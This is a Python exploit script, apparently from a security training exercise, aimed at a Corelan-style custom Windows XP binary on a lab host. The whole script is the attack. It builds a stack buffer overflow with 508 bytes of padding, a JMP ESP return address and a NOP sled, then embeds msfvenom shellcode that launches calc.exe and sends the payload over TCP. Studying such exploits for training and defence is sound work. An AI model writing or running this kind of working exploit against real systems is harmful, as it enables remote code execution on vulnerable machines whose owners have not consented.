#!/usr/bin/python

# Author: Michael Music
# Date: 3/23/2019
# Description: Custom Binary from Corelan BOF
#  Exercise in bypassing stack cookies
#  Tested on Windows XP
# Notes: This is the standard exploit against the non-stack cookie binary


import socket
import os
import sys

host='10.10.10.102'
port=200

# EIP at 508
# ESP at 512
# EAX at 0
# JMP ESP at 0x7c874413

buf = ''
buf += 'A' * (508)
buf += '\x13\x44\x87\x7c'
buf += '\x90' * (20)

# msfvenom -p windows/exec CMD=calc.exe -b "\x00" -f python
buf += "\xdb\xc8\xd9\x74\x24\xf4\xb8\x7c\xc4\x55\x47\x5b\x33"
buf += "\xc9\xb1\x31\x83\xeb\xfc\x31\x43\x14\x03\x43\x68\x26"
buf += "\xa0\xbb\x78\x24\x4b\x44\x78\x49\xc5\xa1\x49\x49\xb1"
buf += "\xa2\xf9\x79\xb1\xe7\xf5\xf2\x97\x13\x8e\x77\x30\x13"
buf += "\x27\x3d\x66\x1a\xb8\x6e\x5a\x3d\x3a\x6d\x8f\x9d\x03"
buf += "\xbe\xc2\xdc\x44\xa3\x2f\x8c\x1d\xaf\x82\x21\x2a\xe5"
buf += "\x1e\xc9\x60\xeb\x26\x2e\x30\x0a\x06\xe1\x4b\x55\x88"
buf += "\x03\x98\xed\x81\x1b\xfd\xc8\x58\x97\x35\xa6\x5a\x71"
buf += "\x04\x47\xf0\xbc\xa9\xba\x08\xf8\x0d\x25\x7f\xf0\x6e"
buf += "\xd8\x78\xc7\x0d\x06\x0c\xdc\xb5\xcd\xb6\x38\x44\x01"
buf += "\x20\xca\x4a\xee\x26\x94\x4e\xf1\xeb\xae\x6a\x7a\x0a"
buf += "\x61\xfb\x38\x29\xa5\xa0\x9b\x50\xfc\x0c\x4d\x6c\x1e"
buf += "\xef\x32\xc8\x54\x1d\x26\x61\x37\x4b\xb9\xf7\x4d\x39"
buf += "\xb9\x07\x4e\x6d\xd2\x36\xc5\xe2\xa5\xc6\x0c\x47\x59"
buf += "\x8d\x0d\xe1\xf2\x48\xc4\xb0\x9e\x6a\x32\xf6\xa6\xe8"
buf += "\xb7\x86\x5c\xf0\xbd\x83\x19\xb6\x2e\xf9\x32\x53\x51"
buf += "\xae\x33\x76\x32\x31\xa0\x1a\x9b\xd4\x40\xb8\xe3"

buf += 'C' * (1000 - len(buf))

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((host, port))
expl.send(buf)
expl.close()
